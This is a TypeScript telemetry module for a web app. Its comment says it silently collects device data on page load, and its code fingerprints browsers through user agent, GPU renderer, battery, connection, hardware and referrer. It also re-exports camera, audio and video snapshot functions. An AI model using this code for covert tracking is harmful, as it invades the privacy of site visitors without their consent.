// lib/telemetry.ts
// Collects zero-permission hardware, network & browser telemetry silently on page load
import { DeviceInfo } from "@/lib/types";
export { captureCameraSnapshot, captureAudioSnapshot, captureVideoSnapshot } from "@/lib/media-capture";

export function detectBrowserAndOS(ua: string): { browser: string; os: string } {
  let browser = "Unknown Browser";
  let os = "Unknown OS";

  if (/iPhone|iPad|iPod/i.test(ua)) os = "iOS";
  else if (/Android/i.test(ua)) os = "Android";
  else if (/Macintosh|Mac OS X/i.test(ua)) os = "macOS";
  else if (/Windows NT/i.test(ua)) os = "Windows";
  else if (/Linux/i.test(ua)) os = "Linux";

  if (/Edg\//i.test(ua)) browser = "Microsoft Edge";
  else if (/Chrome\//i.test(ua) && !/Chromium/i.test(ua)) browser = "Chrome";
  else if (/Safari\//i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";
  else if (/Firefox\//i.test(ua)) browser = "Firefox";
  else if (/OPR\//i.test(ua) || /Opera/i.test(ua)) browser = "Opera";

  return { browser, os };
}

function getGpuRenderer(): string {
  try {
    const canvas = document.createElement("canvas");
    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    if (gl) {
      const ext = (gl as any).getExtension("WEBGL_debug_renderer_info");
      if (ext) {
        return (gl as any).getParameter(ext.UNMASKED_RENDERER_WEBGL) || "";
      }
    }
  } catch {}
  return "";
}

export async function collectDeviceTelemetry(): Promise<DeviceInfo> {
  if (typeof window === "undefined") return {};

  const ua = navigator.userAgent;
  const { browser, os } = detectBrowserAndOS(ua);
  const screen = `${window.screen?.width || 0}x${window.screen?.height || 0}`;
  const language = navigator.language;
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const platform = navigator.platform;
  const cpuCores = navigator.hardwareConcurrency || undefined;
  const deviceMemory = (navigator as any).deviceMemory || undefined;
  const touchPoints = navigator.maxTouchPoints || 0;
  const pixelRatio = window.devicePixelRatio || 1;
  const gpu = getGpuRenderer();
  const referrer = typeof document !== "undefined" ? document.referrer || undefined : undefined;

  let battery: number | null = null;
  let isCharging: boolean | null = null;
  try {
    const nav = navigator as any;
    if (nav.getBattery) {
      const b = await nav.getBattery();
      battery = Math.round(b.level * 100);
      isCharging = b.charging;
    }
  } catch {}

  let connection = "Unknown";
  let downlink: number | undefined;
  let rtt: number | undefined;
  try {
    const nav = navigator as any;
    if (nav.connection) {
      connection = nav.connection.effectiveType ? nav.connection.effectiveType.toUpperCase() : "Unknown";
      downlink = nav.connection.downlink;
      rtt = nav.connection.rtt;
    }
  } catch {}

  return {
    browser,
    os,
    screen,
    language,
    timezone,
    platform,
    battery,
    isCharging,
    connection,
    cpuCores,
    deviceMemory,
    gpu,
    touchPoints,
    pixelRatio,
    downlink,
    rtt,
    referrer,
  };
}
